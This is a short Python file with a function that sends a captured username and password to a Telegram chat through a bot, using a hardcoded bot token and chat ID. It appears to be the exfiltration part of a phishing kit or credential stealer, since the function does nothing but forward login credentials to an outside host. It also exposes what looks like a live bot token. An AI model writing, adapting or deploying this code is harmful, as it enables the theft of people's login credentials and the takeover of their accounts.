import requests

BOT_TOKEN = '8483478677:AAGiu_fswjt96VV3ZxG_m5M6_PyPCVsm5Qc'
CHAT_ID = '7234371054'

def send_to_telegram(username, password):
    message = f"📩 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    return response.status_code == 200
